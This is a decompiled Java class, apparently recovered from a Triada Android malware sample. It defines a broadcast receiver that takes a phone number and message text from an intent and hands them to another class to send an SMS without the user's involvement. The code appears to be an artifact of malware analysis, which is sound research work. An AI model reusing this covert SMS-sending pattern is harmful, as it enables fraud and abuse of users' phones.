package com.android.essdk.eyou.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.android.essdk.eyou.e.b;

public class SendSmsReceiver extends BroadcastReceiver {
  private static SendSmsReceiver a = null;
  
  public static SendSmsReceiver a() {
    // Byte code:
    //   0: ldc com/android/essdk/eyou/sms/SendSmsReceiver
    //   2: monitorenter
    //   3: getstatic com/android/essdk/eyou/sms/SendSmsReceiver.a : Lcom/android/essdk/eyou/sms/SendSmsReceiver;
    //   6: ifnonnull -> 21
    //   9: new com/android/essdk/eyou/sms/SendSmsReceiver
    //   12: astore_0
    //   13: aload_0
    //   14: invokespecial <init> : ()V
    //   17: aload_0
    //   18: putstatic com/android/essdk/eyou/sms/SendSmsReceiver.a : Lcom/android/essdk/eyou/sms/SendSmsReceiver;
    //   21: ldc com/android/essdk/eyou/sms/SendSmsReceiver
    //   23: monitorexit
    //   24: getstatic com/android/essdk/eyou/sms/SendSmsReceiver.a : Lcom/android/essdk/eyou/sms/SendSmsReceiver;
    //   27: areturn
    //   28: astore_0
    //   29: ldc com/android/essdk/eyou/sms/SendSmsReceiver
    //   31: monitorexit
    //   32: aload_0
    //   33: athrow
    // Exception table:
    //   from	to	target	type
    //   3	21	28	finally
    //   21	24	28	finally
    //   29	32	28	finally
  }
  
  public void onReceive(Context paramContext, Intent paramIntent) {
    if ("android.easou.eyou.SEND_SMS_RECEIVER".equals(paramIntent.getAction())) {
      b.c("epay_log", "初始化短信发送!");
      String str2 = paramIntent.getStringExtra("mobile");
      String str1 = paramIntent.getStringExtra("content");
      (new d()).b(paramContext, str2, str1);
      paramContext.unregisterReceiver(a());
    } 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/sms/SendSmsReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */